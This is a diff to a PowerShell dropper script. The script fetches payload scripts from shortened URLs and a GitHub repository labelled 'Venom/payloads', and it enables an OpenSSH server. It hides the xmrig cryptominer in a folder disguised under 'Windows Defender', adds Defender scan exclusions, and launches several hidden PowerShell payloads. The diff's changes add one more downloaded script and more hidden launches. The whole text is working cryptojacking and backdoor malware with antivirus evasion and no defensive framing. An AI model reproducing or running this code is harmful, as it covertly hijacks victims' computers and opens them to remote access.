@@ -63,12 +63,12 @@ Remove-Item -Path $configfile
 mkdir $path
 cd $path
 
-
 Invoke-WebRequest -UseBasicParsing -OutFile "QyjAaZDBbNPk.reg" -Uri "http://tiny.cc/k5cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "FoRAUwtxKkSB.vbs" -Uri "http://tiny.cc/s5cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "ZDaFvwjOosKx.vbs" -Uri "http://tiny.cc/y5cg001"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/s.ps1" -UseBasicParsing -OutFile "ysAhVvSZMXDP.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/mon1.ps1" -UseBasicParsing -OutFile "GifdJUKferot.ps1"
 
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -83,6 +83,7 @@ $tasks = "C:\ProgramData\Microsoft\Windows"
 
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks
+Move-Item -Path "$initial_dir\AmJOwiWzUEbZ.ps1" -Destination $tasks
 
 
 Start-Sleep -Seconds 30
@@ -93,11 +94,13 @@ Set-Variable -Name currentDir -Value ($Pwd)
 
 Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
 
-mkdir "$initial_dir\xmrig-6.22.2"
+$confirm = "C:\ProgramData\Microsoft\Windows Defender"
 
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir\xmrig-6.22.2"
+mkdir "$confirm\xmrig-6.22.2"
 
-Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$confirm\xmrig-6.22.2"
+
+Set-ItemProperty -Value "Hidden" -Path "$confirm\xmrig-6.22.2" -Name Attributes
 
 Remove-Item -Path "$initial_dir\ip.txt"
 
@@ -112,7 +115,6 @@ if (Test-Path -Path '...' -PathType Container) {
 
 
 cd $path
-Remove-Item -Path "w.bat"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
@@ -133,6 +135,10 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
+
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\GifdJUKferot.ps1`"" -NoNewWindow
+
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AmJOwiWzUEbZ.ps1`"" -NoNewWindow
 
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\ysAhVvSZMXDP.ps1`"" -NoNewWindow
 
